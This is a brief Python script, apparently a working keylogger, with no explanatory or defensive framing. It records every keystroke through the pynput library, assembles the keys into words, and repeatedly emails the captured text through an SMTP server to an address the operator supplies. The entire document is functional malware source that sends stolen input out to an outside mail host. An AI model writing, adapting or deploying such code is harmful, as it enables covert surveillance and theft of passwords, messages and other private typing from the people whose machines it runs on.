import getpass
import smtplib

from pynput.keyboard import Key, Listener

email =  input('Email: ')
password =  getpass.getpass(prompt = 'Password: ', stream = None)
server = smtplib.SMTP_SSL('smtp.libero.it', 465)
server.login(email, password)

full_log = ("From: %s\r\nTo: %s\r\n\r\n" % (email, email))
word = ''
email_char_limit = 20

def on_press(key):
	global word
	global full_log
	global email
	global email_char_limit

	if key == Key.space or key == Key.enter:
		word += ' '
		full_log += word
		word = ''
		if len(full_log) >= email_char_limit:
			server.sendmail(email,email,full_log)
			full_log = ("From: %s\r\nTo: %s\r\n\r\n" % (email, email))
	elif key == Key.shift_l or key == Key.shift_r:
		return
	elif key == Key.backspace:
		word = word[:-1]
	else:
		char = f'{key}'
		char = char[1:-1]
		word += char

	if key == Key.esc:
		return False

with Listener(on_press=on_press) as listener:
	listener.join()